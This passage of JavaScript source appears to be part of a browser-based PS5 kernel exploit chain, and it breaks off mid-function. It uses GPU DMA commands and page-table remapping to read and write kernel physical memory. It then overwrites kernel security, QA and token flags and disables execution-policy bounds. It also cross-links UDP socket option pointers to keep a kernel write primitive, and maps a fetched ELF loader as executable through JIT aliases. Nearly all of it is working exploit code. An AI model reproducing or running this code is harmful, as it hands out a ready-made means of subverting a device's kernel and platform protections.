            const base = this.rootContext.dataBase.add32(this.o("post.gvmspace")
                + vmid * this.o("post.sizeofGvmspace"));
            const start = this.kernel.read64(base.add32(8));
            const size = this.kernel.read64(base.add32(0x10));
            const va = U64.from(userAddress);
            if (va.compare(start) < 0 || va.compare(start.add(size)) >= 0) return null;
            return this.gpuWalkPt(vmid, va.sub(start));
        }

        allocateDmem(size, protection, flags) {
            this.out.put64(0, 0);
            const allocate = this.bridge.callOffsetI32(
                "native.exports.allocateMainDirectMemory",
                [size, size, 1, this.out.address]);
            if (allocate !== 0) throw new Error(`direct memory allocation failed ${allocate}`);
            const physical = this.out.get64(0);
            this.out.put64(0, 0);
            const map = this.bridge.callOffsetI32("native.exports.mapDirectMemory",
                [this.out.address, size, protection, flags, physical, size]);
            if (map !== 0) throw new Error(`direct memory map failed ${map}`);
            return { address: this.out.get64(0).toPointerNumber(), physical };
        }

        pm4Header(opcode, count) {
            return (2 | ((opcode & 0xff) << 8)
                | (((count - 1) & 0x3fff) << 16) | (3 << 30)) >>> 0;
        }

        writeDmaCommand(destination, source, length) {
            const command = this.kernel.memory;
            command.write32(this.commandVa + 0x00, this.pm4Header(0x50, 6));
            command.write32(this.commandVa + 0x04, 0x8c00c000);
            const src = U64.from(source), dst = U64.from(destination);
            command.write32(this.commandVa + 0x08, src.lo);
            command.write32(this.commandVa + 0x0c, src.hi);
            command.write32(this.commandVa + 0x10, dst.lo);
            command.write32(this.commandVa + 0x14, dst.hi);
            command.write32(this.commandVa + 0x18, length & 0x1fffff);
            return 28;
        }

        sleep(milliseconds) {
            this.timespec.put64(0, Math.floor(milliseconds / 1000));
            this.timespec.put64(8, (milliseconds % 1000) * 1000000);
            this.bridge.callOffset("native.exports.nanosleep", [this.timespec.address, 0]);
        }

        submit(commandSize) {
            const command = U64.from(this.commandVa);
            const first = command.and("0xffffffff").shl(32).or("0xc0023f00");
            const second = U64.from(commandSize >>> 2).shl(32)
                .or(command.shru(32).and("0xffff"));
            this.ioctlDesc.put64(0, first);
            this.ioctlDesc.put64(8, second);
            this.ioctlSub.put32(0, 0);
            this.ioctlSub.put32(4, 1);
            this.ioctlSub.put64(8, this.ioctlDesc.address);
            const result = this.bridge.callOffsetI32("native.exports.ioctl",
                [this.gpuFd, "0xc0108102", this.ioctlSub.address]);
            if (result !== 0) throw new Error(`GPU submit ioctl failed ${result}`);
            this.sleep(GPU_DMA_SETTLE_MS);
        }

        verifyDmaCanary() {
            // Exercise the exact command-buffer, ioctl, and GPU scheduling
            // path against disposable direct memory before any kernel target
            // is written.  Seed different values so a command that never ran
            // cannot accidentally pass by observing untouched memory.
            const victim = this.victimVa + 0x1000;
            const baseline = 0xae583f21;
            const marker = 0x51a7c0de;
            this.kernel.memory.write32(victim, baseline);
            this.kernel.memory.write32(this.transferVa, marker);
            if ((this.kernel.memory.read32(victim) >>> 0) !== baseline
                    || (this.kernel.memory.read32(this.transferVa) >>> 0) !== marker)
                throw new Error("GPU DMA canary buffers failed CPU initialization");
            this.submit(this.writeDmaCommand(victim, this.transferVa, 4));
            const observed = this.kernel.memory.read32(victim) >>> 0;
            if (observed !== marker)
                throw new Error(`GPU DMA canary did not complete after `
                    + `${GPU_DMA_SETTLE_MS}ms: expected=0x${marker.toString(16)}`
                    + ` observed=0x${observed.toString(16)}`);
            this.kernel.markProgress?.("GPU-DMA-CANARY-VERIFIED",
                `settle=${GPU_DMA_SETTLE_MS}ms`);
        }

        transferPhysical(physicalAddress, size, isWrite) {
            physicalAddress = U64.from(physicalAddress);
            const regionMask = U64.fromHex("0xffffffffffe00000");
            const truncated = physicalAddress.and(regionMask);
            const offset = physicalAddress.sub(truncated).toNumber();
            if (!Number.isInteger(size) || size <= 0
                    || offset + size > 0x200000)
                throw new RangeError(`GPU transfer crosses its 2 MiB window: `
                    + `offset=0x${offset.toString(16)} size=0x${Number(size).toString(16)}`);
            const protectionRo = 0x13;
            const protectionRw = 0x33;
            if (this.bridge.callOffsetI32("native.exports.mprotect",
                [this.victimVa, 0x200000, protectionRo]) !== 0)
                throw new Error("GPU victim read-only transition failed");
            this.kernel.write64(this.victimPtbe, this.clearedPtbe.or(truncated));
            if (this.bridge.callOffsetI32("native.exports.mprotect",
                [this.victimVa, 0x200000, protectionRw]) !== 0)
                throw new Error("GPU victim remap transition failed");
            const source = isWrite ? this.transferVa : this.victimVa + offset;
            const destination = isWrite ? this.victimVa + offset : this.transferVa;
            this.submit(this.writeDmaCommand(destination, source, size));
        }

        read32(address) {
            const physical = this.virtToPhys(address, this.kernelCr3);
            if (physical.isZero()) throw new Error("GPU virtual-to-physical read failed");
            this.transferPhysical(physical, 4, false);
            return this.kernel.memory.read32(this.transferVa);
        }

        write32(address, value) {
            const physical = this.virtToPhys(address, this.kernelCr3);
            if (physical.isZero()) throw new Error("GPU virtual-to-physical write failed");
            this.kernel.memory.write32(this.transferVa, value);
            this.transferPhysical(physical, 4, true);
            return physical;
        }

        write8(address, value) {
            const physical = this.virtToPhys(address, this.kernelCr3);
            if (physical.isZero()) throw new Error("GPU virtual-to-physical byte write failed");
            this.kernel.memory.write8(this.transferVa, value & 0xff);
            this.transferPhysical(physical, 1, true);
            return physical;
        }


        setup() {
            this.discoverKernelTranslation();
            const process = this.attestProcTranslation(this.rootContext.curproc);
            this.allocateWorkBuffers();
            this.gpuFd = this.bridge.callOffsetI32("native.exports.open",
                [this.path.address, 2, 0]);
            if (this.gpuFd < 0) throw new Error("opening /dev/gc failed");
            // gpuFd is not closed on subsequent errors; reboot-on-failure reclaims it.
            const victim = this.allocateDmem(0x200000, 0x33, 0x400000);
            const transfer = this.allocateDmem(0x200000, 0x33, 0x400000);
            const command = this.allocateDmem(0x200000, 0x33, 0x400000);
            this.victimVa = victim.address;
            this.transferVa = transfer.address;
            this.commandVa = command.address;
            const realPhysical = this.stableVirtToPhys(this.victimVa, process.cr3);
            if (realPhysical.isZero())
                throw new Error(`GPU victim mapping did not translate through attested process CR3 ${process.cr3.toHex()}`);
            const entry = this.getPtbEntry(this.rootContext.curproc, this.victimVa);
            if (!entry || entry.pageSize !== 0x200000)
                throw new Error("GPU victim mapping is not a 2 MiB page");
            this.victimPtbe = entry.entry;
            if (this.bridge.callOffsetI32("native.exports.mprotect",
                [this.victimVa, 0x200000, 0x13]) !== 0)
                throw new Error("GPU initial read-only transition failed");
            const initial = this.kernel.read64(this.victimPtbe);
            this.clearedPtbe = initial.and(realPhysical.not());
            if (this.bridge.callOffsetI32("native.exports.mprotect",
                [this.victimVa, 0x200000, 0x33]) !== 0)
                throw new Error("GPU initial writable transition failed");
            this.verifyDmaCanary();
        }

        securityState(security) {
            const stable32 = (address, label) => {
                const first = this.kernel.read32(address) >>> 0;
                const second = this.kernel.read32(address) >>> 0;
                if (first !== second)
                    throw new Error(`GPU ${label} changed across kernel reads: `
                        + `first=0x${first.toString(16).padStart(8, "0")} `
                        + `second=0x${second.toString(16).padStart(8, "0")}`);
                return first;
            };
            const utoken = security.add32(0x8c);
            const utokenWord = stable32(
                utoken.and("0xfffffffffffffffc"), "utoken word");
            return {
                securityFlags: stable32(security, "security flags"),
                targetId: (stable32(security.add32(8), "target ID word") >>> 8) & 0xff,
                qaFlags: stable32(security.add32(0x24), "QA flags"),
                utoken: (utokenWord >>> ((utoken.lo & 3) * 8)) & 0xff
            };
        }

        rollbackSecurityPatch(journal, cause) {
            const failures = [];
            for (let index = journal.length - 1; index >= 0; --index) {
                const entry = journal[index];
                try {
                    entry.write(entry.before);
                    const observed = entry.read();
                    if (observed !== entry.before) {
                        throw new Error(`expected=0x${entry.before.toString(16)}`
                            + ` observed=0x${observed.toString(16)}`);
                    }
                } catch (error) {
                    failures.push(`${entry.field}: ${error.message}`);
                }
            }
            if (failures.length) {
                const error = new Error(`GPU security patch failed: ${cause.message};`
                    + ` rollback failed: ${failures.join("; ")}`);
                error.cause = cause;
                error.rollbackVerified = false;
                error.rebootRequired = true;
                throw error;
            }
            const error = new Error(`GPU security patch failed and was rolled back:`
                + ` ${cause.message}`);
            error.cause = cause;
            error.rollbackVerified = true;
            error.rebootRequired = true;
            return error;
        }

        patch() {
            const security = this.rootContext.dataBase.add32(
                this.o("post.securityFlags"));
            const before = this.securityState(security);
            const basePhysical = { value: null };
            const journal = [];
            this.patchJournal = journal;
            const mutate = (field, address, beforeValue, intended, write, read) => {
                const entry = { field, address, before: beforeValue,
                    intended, write, read };
                journal.push(entry);
                const physical = write(intended);
                const observed = read();
                const delta = address.sub(security);
                const translationContiguous = physical instanceof U64
                    && delta.hi === 0
                    && (physical.lo & 0xfff) === (address.lo & 0xfff)
                    && (basePhysical.value === null
                        ? delta.lo === 0
                        : physical.eq(basePhysical.value.add32(delta.lo)));
                if (basePhysical.value === null && delta.lo === 0
                    && physical instanceof U64)
                    basePhysical.value = physical;
                if (observed !== intended || !translationContiguous) {
                    throw new Error(`GPU ${field} write verification failed: `
                        + `expected=0x${intended.toString(16)} `
                        + `observed=0x${observed.toString(16)} `
                        + `translation=${translationContiguous}`);
                }
            };
            const stable32 = (address, label) => {
                const first = this.kernel.read32(address) >>> 0;
                const second = this.kernel.read32(address) >>> 0;
                if (first !== second)
                    throw new Error(`GPU ${label} changed across kernel reads: `
                        + `first=0x${first.toString(16).padStart(8, "0")} `
                        + `second=0x${second.toString(16).padStart(8, "0")}`);
                return first;
            };
            const readByte = (address, label) => {
                const aligned = address.and("0xfffffffffffffffc");
                const shift = (address.lo & 3) * 8;
                return (stable32(aligned, label) >>> shift) & 0xff;
            };
            const targetId = security.add32(9);
            const qaFlags = security.add32(0x24);
            const utoken = security.add32(0x8c);
            try {
                mutate("securityFlags", security, before.securityFlags,
                    (before.securityFlags | 0x14) >>> 0,
                    (value) => this.write32(security, value),
                    () => stable32(security, "security flags readback"));
                mutate("targetId", targetId, before.targetId, 0x82,
                    (value) => this.write8(targetId, value),
                    () => readByte(targetId, "target ID readback"));
                mutate("qaFlags", qaFlags, before.qaFlags,
                    (before.qaFlags | 0x10300) >>> 0,
                    (value) => this.write32(qaFlags, value),
                    () => stable32(qaFlags, "QA flags readback"));
                mutate("utoken", utoken, before.utoken,
                    (before.utoken | 1) & 0xff,
                    (value) => this.write8(utoken, value),
                    () => readByte(utoken, "utoken readback"));
                const after = this.securityState(security);
                if ((after.securityFlags & 0x14) !== 0x14
                    || after.targetId !== 0x82
                    || (after.qaFlags & 0x10300) !== 0x10300
                    || (after.utoken & 1) !== 1)
                    throw new Error("GPU security patch final verification failed");
                this.patchResult = Object.freeze({ before, after,
                    writes: journal.length, rollbackVerified: null });
                return this.patchResult;
            } catch (error) {
                throw this.rollbackSecurityPatch(journal, error);
            }
        }
    }

    class Elf64Image {
        constructor(bytes) {
            this.bytes = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
            this.view = new DataView(this.bytes.buffer, this.bytes.byteOffset,
                this.bytes.byteLength);
            if (this.bytes.length < 0x40 || this.view.getUint32(0, true) !== 0x464c457f)
                throw new Error("loader is not an ELF image");
            if (this.bytes[4] !== 2 || this.bytes[5] !== 1
                || this.view.getUint16(0x12, true) !== 0x3e)
                throw new Error("loader is not little-endian ELF64 x86-64");
            this.entry = this.u64Number(0x18);
            this.phoff = this.u64Number(0x20);
            this.shoff = this.u64Number(0x28);
            this.phentsize = this.view.getUint16(0x36, true);
            this.phnum = this.view.getUint16(0x38, true);
            this.shentsize = this.view.getUint16(0x3a, true);
            this.shnum = this.view.getUint16(0x3c, true);
            if (this.phentsize !== 0x38
                || (this.shnum !== 0 && this.shentsize !== 0x40))
                throw new Error("unexpected ELF table layout");
            if (this.phoff + this.phnum * this.phentsize > this.bytes.length
                || this.shoff + this.shnum * this.shentsize > this.bytes.length)
                throw new Error("ELF table exceeds the pinned image");
        }

        u64(offset) {
            return new U64(this.view.getUint32(offset, true),
                this.view.getUint32(offset + 4, true));
        }
        u64Number(offset) { return this.u64(offset).toNumber(); }

        programHeaders() {
            const out = [];
            for (let i = 0; i < this.phnum; ++i) {
                const at = this.phoff + i * this.phentsize;
                const header = { type: this.view.getUint32(at, true),
                    flags: this.view.getUint32(at + 4, true),
                    offset: this.u64Number(at + 8), vaddr: this.u64Number(at + 0x10),
                    filesz: this.u64Number(at + 0x20), memsz: this.u64Number(at + 0x28) };
                if (header.type === 1 && (header.memsz < header.filesz
                    || header.offset + header.filesz > this.bytes.length))
                    throw new Error(`ELF load segment ${i} is out of bounds`);
                out.push(header);
            }
            return out;
        }

        relocations() {
            const out = [];
            for (let i = 0; i < this.shnum; ++i) {
                const at = this.shoff + i * this.shentsize;
                if (this.view.getUint32(at + 4, true) !== 4) continue;
                const offset = this.u64Number(at + 0x18);
                const size = this.u64Number(at + 0x20);
                const entsize = this.u64Number(at + 0x38) || 0x18;
                if (entsize < 0x18 || size % entsize !== 0
                    || offset + size > this.bytes.length)
                    throw new Error(`ELF relocation section ${i} is out of bounds`);
                for (let cursor = 0; cursor < size; cursor += entsize) {
                    const entry = offset + cursor;
                    out.push({ offset: this.u64Number(entry), info: this.u64(entry + 8),
                        addend: this.u64(entry + 0x10) });
                }
            }
            return out;
        }

        globDatRelocations() {
            let dynsymOff = 0, dynsymEntsize = 0, strtabIdx = 0;
            for (let i = 0; i < this.shnum; ++i) {
                const at = this.shoff + i * this.shentsize;
                if (this.view.getUint32(at + 4, true) === 11) {
                    dynsymOff = this.u64Number(at + 0x18);
                    dynsymEntsize = this.u64Number(at + 0x38) || 0x18;
                    strtabIdx = this.view.getUint32(at + 0x28, true);
                    break;
                }
            }
            if (!dynsymOff || strtabIdx >= this.shnum) return [];
            const strtabAt = this.shoff + strtabIdx * this.shentsize;
            const strtabOff = this.u64Number(strtabAt + 0x18);
            const strtabEnd = strtabOff + this.u64Number(strtabAt + 0x20);
            const out = [];
            for (const reloc of this.relocations()) {
                if (reloc.info.lo !== 6) continue;
                const symIdx = reloc.info.hi;
                const nameOff = this.view.getUint32(
                    dynsymOff + symIdx * dynsymEntsize, true);
                let end = strtabOff + nameOff;
                while (end < strtabEnd && this.bytes[end] !== 0) end++;
                const name = Array.from(
                    this.bytes.subarray(strtabOff + nameOff, end),
                    (b) => String.fromCharCode(b)).join("");
                out.push({ offset: reloc.offset, name });
            }
            return out;
        }

    }

    function sha256FallbackHex(input) {
        let bytes;
        if (input instanceof ArrayBuffer)
            bytes = new Uint8Array(input);
        else if (ArrayBuffer.isView(input))
            bytes = new Uint8Array(input.buffer, input.byteOffset, input.byteLength);
        else
            throw new TypeError("SHA-256 input must be an ArrayBuffer or view");

        // Keep the fallback self-contained and allocation-bounded. The PS5
        // browser does not expose Web Crypto, and the pinned loader must still
        // be authenticated before any of its bytes are mapped executable.
        const constants = new Uint32Array([
            0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
            0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
            0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
            0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
            0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
            0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
            0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
            0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
            0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
            0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
            0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
            0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
            0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
            0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
            0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
            0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
        ]);
        const state = new Uint32Array([
            0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
            0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19
        ]);
        const words = new Uint32Array(64);
        const block = new Uint8Array(64);
        const paddedLength = Math.ceil((bytes.byteLength + 9) / 64) * 64;
        const bitLengthHigh = Math.floor(bytes.byteLength / 0x20000000) >>> 0;
        const bitLengthLow = (bytes.byteLength * 8) >>> 0;
        const rotateRight = (value, count) =>
            ((value >>> count) | (value << (32 - count))) >>> 0;

        for (let offset = 0; offset < paddedLength; offset += 64) {
            block.fill(0);
            for (let index = 0; index < 64; ++index) {
                const source = offset + index;
                if (source < bytes.byteLength)
                    block[index] = bytes[source];
                else if (source === bytes.byteLength)
                    block[index] = 0x80;
            }
            if (offset + 64 === paddedLength) {
                block[56] = bitLengthHigh >>> 24;
                block[57] = bitLengthHigh >>> 16;
                block[58] = bitLengthHigh >>> 8;
                block[59] = bitLengthHigh;
                block[60] = bitLengthLow >>> 24;
                block[61] = bitLengthLow >>> 16;
                block[62] = bitLengthLow >>> 8;
                block[63] = bitLengthLow;
            }

            for (let index = 0; index < 16; ++index) {
                const cursor = index * 4;
                words[index] = ((block[cursor] << 24)
                    | (block[cursor + 1] << 16)
                    | (block[cursor + 2] << 8)
                    | block[cursor + 3]) >>> 0;
            }
            for (let index = 16; index < 64; ++index) {
                const x = words[index - 15];
                const y = words[index - 2];
                const sigma0 = rotateRight(x, 7) ^ rotateRight(x, 18) ^ (x >>> 3);
                const sigma1 = rotateRight(y, 17) ^ rotateRight(y, 19) ^ (y >>> 10);
                words[index] = (words[index - 16] + sigma0
                    + words[index - 7] + sigma1) >>> 0;
            }

            let a = state[0];
            let b = state[1];
            let c = state[2];
            let d = state[3];
            let e = state[4];
            let f = state[5];
            let g = state[6];
            let h = state[7];
            for (let index = 0; index < 64; ++index) {
                const sum1 = rotateRight(e, 6) ^ rotateRight(e, 11)
                    ^ rotateRight(e, 25);
                const choose = (e & f) ^ (~e & g);
                const temporary1 = (h + sum1 + choose
                    + constants[index] + words[index]) >>> 0;
                const sum0 = rotateRight(a, 2) ^ rotateRight(a, 13)
                    ^ rotateRight(a, 22);
                const majority = (a & b) ^ (a & c) ^ (b & c);
                const temporary2 = (sum0 + majority) >>> 0;
                h = g;
                g = f;
                f = e;
                e = (d + temporary1) >>> 0;
                d = c;
                c = b;
                b = a;
                a = (temporary1 + temporary2) >>> 0;
            }
            state[0] = (state[0] + a) >>> 0;
            state[1] = (state[1] + b) >>> 0;
            state[2] = (state[2] + c) >>> 0;
            state[3] = (state[3] + d) >>> 0;
            state[4] = (state[4] + e) >>> 0;
            state[5] = (state[5] + f) >>> 0;
            state[6] = (state[6] + g) >>> 0;
            state[7] = (state[7] + h) >>> 0;
        }
        return Array.from(state, (value) =>
            value.toString(16).padStart(8, "0")).join("");
    }

    async function sha256Hex(bytes) {
        let subtle = null;
        try { subtle = root.crypto?.subtle; } catch {}
        if (subtle && typeof subtle.digest === "function") {
            try {
                const digest = new Uint8Array(await subtle.digest("SHA-256", bytes));
                if (digest.byteLength === 32)
                    return Array.from(digest, (value) =>
                        value.toString(16).padStart(2, "0")).join("");
            } catch {}
        }
        return sha256FallbackHex(bytes);
    }

    class ElfLoader {
        constructor(kernel, rootContext, switcher, options) {
            this.kernel = kernel;
            this.profile = kernel.profile;
            this.bridge = kernel.bridge;
            this.memory = kernel.memory;
            this.rootContext = rootContext;
            this.switcher = switcher;
            this.mappingBase = U64.from(this.profile.value("loader.mappingAddress"));
            this.shadowBase = U64.from(this.profile.value("loader.shadowAddress"));
            this.executableRegion = null;
            this.imageEnd = 0;
            this.libcBase = null;
            this.prepared = null;
            this.started = false;
            if (options?.libcBase !== undefined
                && options.libcBase !== null) {
                const libcBase = U64.from(options.libcBase);
                if (!libcBase.isUserPointer()
                    || (libcBase.lo & 0x3fff) !== 0)
                    throw new Error("prevalidated libc base is invalid");
                this.libcBase = libcBase;
            }
        }

        async fetchImage() {
            const expectedSize = this.profile.value("loader.size");
            const response = await fetch(this.profile.value("loader.path"), { cache: "no-store" });
            if (!response.ok)
                throw new Error("pinned elfldr payload is unavailable");
            const buffer = await response.arrayBuffer();
            if (buffer.byteLength !== expectedSize)
                throw new Error(`elfldr size mismatch ${buffer.byteLength}/${expectedSize}`);
            const digest = await sha256Hex(buffer);
            if (digest !== this.profile.value("loader.sha256"))
                throw new Error(`elfldr SHA-256 mismatch: ${digest}`);
            return new Elf64Image(new Uint8Array(buffer));
        }

        fixedMmap(address, size, protection, flags, fd) {
            const result = this.bridge.callOffset("native.exports.mmap",
                [address, size, protection, flags, fd, 0]);
            if (result.isMinusOne() || result.toPointerNumber() !== address)
                throw new Error(`fixed mmap failed at 0x${address.toString(16)}`);
        }

        mapImage(image) {
            let executableStart = 0;
            let executableEnd = 0;
            let executableMappedEnd = 0;
            let executableSegments = 0;
            let imageEnd = 0;
            for (const header of image.programHeaders()) {
                if (header.type !== 1) continue;
                const size = Math.ceil(header.memsz / 0x4000) * 0x4000;
                if (!size) continue;
                imageEnd = Math.max(imageEnd, header.vaddr + header.memsz);
                const destination = this.mappingBase.add32(header.vaddr).toPointerNumber();
                if (header.flags & 1) {
                    executableSegments++;
                    if (executableSegments !== 1)
                        throw new Error("pinned elfldr has multiple executable segments");
                    executableStart = header.vaddr;
                    executableEnd = header.vaddr + header.memsz;
                    executableMappedEnd = header.vaddr + size;
                    const fd = this.kernel.alloc(8, 4, "elf-jit-fds");
                    this.switcher.run(() => {
                        if (this.bridge.callOffsetI32("native.exports.jitCreateSharedMemory",
                            [0, size, 7, fd.address]) !== 0)
                            throw new Error("JIT shared memory creation failed");
                        const executeFd = fd.get32(0) | 0;
                        if (executeFd < 0)
                            throw new Error("JIT shared memory returned an invalid fd");
                        if (this.bridge.callOffsetI32("native.exports.jitCreateAlias",
                            [executeFd, 3, fd.address]) !== 0)
                            throw new Error("JIT write alias creation failed");
                        const writeFd = fd.get32(0) | 0;
                        if (writeFd < 0)
                            throw new Error("JIT write alias returned an invalid fd");
                        this.fixedMmap(this.shadowBase.add32(header.vaddr).toPointerNumber(),
                            size, 3, 0x11, writeFd);
                        this.fixedMmap(destination, size, 5, 0x11, executeFd);
                    });
                    const shadow = this.shadowBase.add32(header.vaddr).toPointerNumber();
                    this.memory.write(shadow,
                        image.bytes.subarray(header.offset, header.offset + header.filesz));
                    if (header.memsz > header.filesz)
                        this.memory.fill(shadow + header.filesz, 0,
                            header.memsz - header.filesz);
                } else {
                    this.fixedMmap(destination, size, 3, 0x1012, U64.ones());
                    this.memory.write(destination,
                        image.bytes.subarray(header.offset, header.offset + header.filesz));
                    if (header.memsz > header.filesz)
                        this.memory.fill(destination + header.filesz, 0,
                            header.memsz - header.filesz);
                }
            }
            if (executableSegments !== 1 || executableEnd <= executableStart)
                throw new Error("pinned elfldr executable segment is missing");
            this.executableRegion = {
                start: executableStart,
                end: executableEnd,
                mappedEnd: executableMappedEnd
            };
            this.imageEnd = imageEnd;
            for (const relocation of image.relocations()) {
                const relocType = relocation.info.lo;
                if (relocType !== 8) continue;
                const inExecutable = relocation.offset >= executableStart
                    && relocation.offset < executableEnd;
                const base = inExecutable ? this.shadowBase : this.mappingBase;
                this.memory.write64(base.add32(relocation.offset).toPointerNumber(),
                    this.mappingBase.add(relocation.addend));
            }
            return this.mappingBase.add32(image.entry).toPointerNumber();
        }

        // Pipe and socket FDs created below are not cleaned up on error.
        // Any failure propagates to the runtime catch block which sets
        // rebootRequired=true; the reboot reclaims all FDs.
        createEnvironment() {
            const pipes = this.kernel.createPipePair("elfldr-pipe");
            const readFile = this.kernel.fget(pipes[0]);
            const writeFile = this.kernel.fget(pipes[1]);
            if (!readFile.isKernelPointer() || !writeFile.isKernelPointer())
                throw new Error("elfldr pipe file pointers are invalid");
            const kernelPipe = this.kernel.read64(readFile);
            if (!kernelPipe.isKernelPointer())
                throw new Error("elfldr kernel pipe pointer is invalid");
            this.kernel.holdFile(pipes[0]);
            this.kernel.holdFile(pipes[1]);

            const constants = this.profile.raw.kernel.constants;
            const master = this.kernel.callI32("native.exports.socket",
                [constants.afInet6, constants.sockDgram, constants.ipprotoUdp]);
            const victim = this.kernel.callI32("native.exports.socket",
                [constants.afInet6, constants.sockDgram, constants.ipprotoUdp]);
            if (master < 0 || victim < 0) throw new Error("elfldr UDP sockets failed");
            const packetInfo = this.kernel.alloc(20, 4, "elfldr-pktinfo");
            packetInfo.fill(0);
            for (const fd of [master, victim]) {
                if (this.kernel.callI32("native.exports.setsockopt",
                    [fd, constants.ipprotoIpv6, constants.ipv6Pktinfo,
                        packetInfo.address, 20]) !== 0)
                    throw new Error("elfldr IPV6_PKTINFO failed");
            }
            const option = (fd) => {
                const file = this.kernel.fget(fd);
                if (!file.isKernelPointer())
                    throw new Error(`elfldr UDP fd ${fd} has an invalid file`);
                this.kernel.holdFile(fd);
                const socket = this.kernel.read64(file);
                if (!socket.isKernelPointer())
                    throw new Error(`elfldr UDP fd ${fd} has an invalid socket`);
                const pcb = this.kernel.read64(socket.add32(0x18));
                if (!pcb.isKernelPointer())
                    throw new Error(`elfldr UDP fd ${fd} has an invalid PCB`);
                return this.kernel.read64(pcb.add32(
                    this.profile.offset("kernel.structures.in6pOutputopts")));
            };
            const masterOption = option(master), victimOption = option(victim);
            if (!masterOption.isKernelPointer() || !victimOption.isKernelPointer()
                || masterOption.eq(victimOption))
                throw new Error("elfldr UDP option pointers are invalid");
            const victimPacketInfo = victimOption.add32(0x10);
            this.kernel.write64(masterOption.add32(0x10), victimPacketInfo);
            const linkReadback = this.kernel.read64(masterOption.add32(0x10));
            if (!linkReadback.eq(victimPacketInfo))
                throw new Error("elfldr UDP option cross-link readback failed");
            return { pipes, kernelPipe, sockets: [master, victim] };
        }

        sleep(milliseconds) {
            const ts = this.kernel.alloc(0x10, 8, "elfldr-wait");
            ts.put64(0, Math.floor(milliseconds / 1000));
            ts.put64(8, (milliseconds % 1000) * 1000000);
            this.bridge.callOffset("native.exports.nanosleep", [ts.address, 0]);
        }

        verifyLoaderPrerequisites() {
            const security = this.rootContext.dataBase.add32(
                this.profile.offset("post.securityFlags"));
            const stable32 = (address, label) => {
                const first = this.kernel.read32(address) >>> 0;
                const second = this.kernel.read32(address) >>> 0;
                if (first !== second)
                    throw new Error(`elfldr ${label} prerequisite is unstable`);
                return first;
            };
            const securityFlags = stable32(security, "security flags");
            const targetWord = stable32(security.add32(8), "target ID");
            const qaFlags = stable32(security.add32(0x24), "QA flags");
            const utokenAddress = security.add32(0x8c);
            const utokenWord = stable32(
                utokenAddress.and("0xfffffffffffffffc"), "utoken");
            const targetId = (targetWord >>> 8) & 0xff;
            const utoken = (utokenWord >>> ((utokenAddress.lo & 3) * 8)) & 0xff;
            const missing = [];
            if ((securityFlags & 0x14) !== 0x14) missing.push("security-flags");
            if (targetId !== 0x82) missing.push("target-id");
            if ((qaFlags & 0x10300) !== 0x10300) missing.push("qa-flags");
            if ((utoken & 1) !== 1) missing.push("utoken");
            if (missing.length)
                throw new Error(`elfldr prerequisites missing: ${missing.join(",")}`);
        }

        patchExecutionPolicy() {
            const ctx = this.rootContext;
            this.kernel.write64(ctx.dynlib.add32(0xf0), U64.zero());
            this.kernel.write64(ctx.dynlib.add32(0xf8), U64.ones());
            this.kernel.write64(ctx.segments.add32(0x08), U64.zero());
            this.kernel.write64(ctx.segments.add32(0x10), U64.ones());
            const after = {
                dynlibStart: this.kernel.read64(ctx.dynlib.add32(0xf0)),
                dynlibEnd: this.kernel.read64(ctx.dynlib.add32(0xf8)),
                segmentStart: this.kernel.read64(ctx.segments.add32(0x08)),
                segmentEnd: this.kernel.read64(ctx.segments.add32(0x10))
            };
            if (!after.dynlibStart.isZero() || !after.dynlibEnd.eq(U64.ones())
                || !after.segmentStart.isZero() || !after.segmentEnd.eq(U64.ones()))
                throw new Error("execution policy patch readback failed");
        }

        getDlsymAddress() {
            return this.bridge.kernel("native.syscallStubs.dynlibDlsym");
        }

        verifyDlsym(dlsymAddress) {
            const expected = this.bridge.kernel("native.syscallStubs.dynlibDlsym");
            const wrapper = this.bridge.kernel("native.exports.dlsym");
            const syscallOffset = this.profile.value("loader.syscallInstructionOffset");
            const syscallAddress = dlsymAddress + syscallOffset;
            const match = dlsymAddress === expected
                && dlsymAddress !== wrapper
                && U64.from(dlsymAddress).isUserPointer()
                && U64.from(wrapper).isUserPointer()
                && U64.from(syscallAddress).isUserPointer();
            if (!match)
                throw new Error(`elfldr dlsym ABI mismatch: `
                    + `raw=0x${dlsymAddress.toString(16)} `
                    + `wrapper=0x${wrapper.toString(16)} `
                    + `syscall=0x${syscallAddress.toString(16)}`);
        }

        getLibcBase() {
            if (this.libcBase) return this.libcBase;
            const anchors = this.profile.value("loader.libcAnchors");
            let base = null;
            for (const symbol of anchors) {
                const slotOffset = this.profile.offset(`webkit.imports.${symbol}.slot`);
                const exportOffset = this.profile.offset(`webkit.imports.${symbol}.export`);
                const slotAddress = this.kernel.webkitBase + slotOffset;
                const resolved = U64.from(this.memory.read64(slotAddress));
                const candidate = resolved.sub(exportOffset);
                const pointerValid = resolved.isUserPointer()
                    && candidate.isUserPointer();
                const aligned = (candidate.lo & 0x3fff) === 0;
                const consistent = base === null || candidate.eq(base);
                const match = pointerValid && aligned && consistent;
                if (!match) {
                    const expected = base ? base.toHex() : "aligned low user pointer";
                    throw new Error(`libc base anchor ${symbol} failed: `
                        + `resolved=${resolved.toHex()} candidate=${candidate.toHex()} `
                        + `expected=${expected}`);
                }
                if (base === null) base = candidate;
            }
            if (!base || !anchors.length)
                throw new Error("libc base validation produced no anchors");
            this.libcBase = base;
            return base;
        }

        resolveGlobDat(image) {
            const entries = image.globDatRelocations();
            if (!entries.length) return;
